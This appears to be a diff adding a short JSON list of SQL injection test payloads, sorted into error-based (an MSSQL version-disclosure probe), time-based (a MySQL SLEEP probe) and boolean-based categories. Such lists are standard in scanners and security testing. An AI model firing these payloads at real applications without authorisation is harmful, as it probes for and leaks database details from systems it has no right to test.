@@ -1,0 +1,22 @@
+{
+  "error_based": [
+    {
+      "payload": "' AND 1=CONVERT(int,(SELECT @@version)) --",
+      "dbms": "mssql",
+      "description": "MSSQL version disclosure"
+    }
+  ],
+  "time_based": [
+    {
+      "payload": "' AND SLEEP(5) --",
+      "dbms": "mysql",
+      "description": "MySQL time-based test"
+    }
+  ],
+  "boolean_based": [
+    {
+      "payload": "' AND 1=1 --",
+      "description": "Boolean-based test"
+    }
+  ]
+} 
